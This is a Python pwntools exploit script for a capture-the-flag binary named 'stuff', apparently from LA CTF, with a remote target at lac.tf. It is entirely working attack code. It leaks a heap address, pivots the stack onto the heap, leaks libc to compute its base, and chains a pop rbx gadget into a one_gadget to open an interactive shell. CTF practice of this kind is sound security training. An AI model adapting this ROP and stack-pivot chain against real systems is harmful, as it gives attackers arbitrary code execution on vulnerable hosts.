#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("stuff_patched")
libc = ELF("./libc.so.6")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "lac.tf", "31182"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

leave_ret = 0x401234
ret = 0x000000000040101a #  ret

sla('stuff\n', '1')
heap = int(rcu(': ', '\n'),16)
logleak('heap', heap)

# pivot on heap, and read other payload
payload = '2'.rjust(8,b' ')+p64(heap)+p64(0x40120f)+p64(heap-0x1008)+p64(leave_ret)
sa('stuff\n', payload)

# second payload put libc address in rsi, and leak it
p.send(p64(heap-0x1008)*2+p64(0x40102c)+p64(0x4011f6))

# get our leak & calculate libc base
leak2 = int(rcu(': ', '\n'),16)
print('leak2 = '+hex(leak2))
libc.address = leak2 - 0x1d5a40
logbase()

onegadgets = one_gadget(libc.path, libc.address)
pop_rbx = libc.address + 0x0000000000031f61 # pop rbx ; ret

# clean rbx for filling gadgets constraints, then call onegadget
payload = '2'.rjust(8,b' ')+p64(0)*2+p64(pop_rbx)+p64(0)+p64(onegadgets[0])
sla('stuff\n', payload)

p.interactive()

